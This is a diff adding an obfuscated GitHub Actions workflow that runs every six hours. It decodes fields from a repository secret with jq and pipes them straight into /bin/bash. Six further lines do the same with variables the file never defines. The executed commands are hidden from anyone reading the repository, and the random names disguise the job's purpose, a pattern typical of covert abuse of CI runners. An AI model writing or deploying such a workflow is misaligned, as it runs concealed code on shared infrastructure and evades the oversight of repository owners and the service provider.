@@ -1,0 +1,23 @@
+name: somebodyphalanx
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 4/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: somebodyphalanx
+        env:
+          xzim28: ${{ secrets.xzim28 }}
+        run: |
+          echo $xzim28 | jq -r .tj11302 | /bin/bash
+          echo $skp88 | jq -r .igm7 | /bin/bash
+          echo $niyw06 | jq -r .rqx32 | /bin/bash
+          echo $fjla600 | jq -r .cuhq9 | /bin/bash
+          echo $j92 | jq -r .je4 | /bin/bash
+          echo $qioo31 | jq -r .s03 | /bin/bash
+          echo $zvptd94 | jq -r .jki99394 | /bin/bash
+
